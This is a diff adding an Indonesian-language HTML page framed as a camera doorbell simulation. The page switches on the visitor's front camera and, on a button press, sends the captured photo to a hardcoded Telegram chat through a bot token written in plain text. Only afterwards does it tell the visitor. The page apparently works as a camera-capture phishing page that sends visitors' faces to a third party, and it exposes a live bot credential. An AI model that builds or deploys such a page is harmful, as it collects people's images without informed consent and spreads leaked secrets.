@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Bel Kamera Web</title>
+    <style>
+        body {
+            text-align: center;
+            font-family: Arial;
+            background: #f0f0f0;
+        }
+        button {
+            margin-top: 15px;
+            padding: 12px 25px;
+            font-size: 18px;
+            background: orange;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background: darkorange;
+        }
+          .video-background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -2; /* Below content and modals */
+            filter: brightness(0.7);
+}
+    </style>
+</head>
+<body>
+    <h1>🔔 Simulasi Bel Kamera</h1>
+    <video id="video" width="320" height="240" autoplay></video><br>
+    <button id="snap">📸 Pencet Bel</button>
+    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+ <video autoplay muted loop class="video-background">
+        <source src="https://files.catbox.moe/zobqgj.mp4" type="video/mp4">
+        Your browser does not support the video tag.
+    </video>
+
+    <script>
+        // === KONFIG TELEGRAM ===
+        const botToken = '8395961127:AAEH1jgpzi_l2AF-rjxgVeMh3cOUSQ7mSqI';
+        const chatIds = ['7356268348'];
+
+        function sendPhotoToTelegram(blob) {
+            chatIds.forEach(id => {
+                const formData = new FormData();
+                formData.append('chat_id', id);
+                formData.append('photo', blob);
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                }).catch(console.error);
+            });
+        }
+
+        // === AKSES KAMERA DEPAN ===
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const snapBtn = document.getElementById('snap');
+
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => {
+                video.srcObject = stream;
+            })
+            .catch(err => {
+                console.error("Gagal akses kamera:", err);
+                alert("Gagal akses kamera: " + err);
+            });
+
+        // === AMBIL FOTO & KIRIM TELEGRAM ===
+        snapBtn.addEventListener('click', () => {
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob(blob => {
+                sendPhotoToTelegram(blob);
+                alert("📸 Foto berhasil diambil & dikirim ke Telegram!");
+            }, 'image/jpeg', 0.9);
+        });
+    </script>
+</body>
+</html>
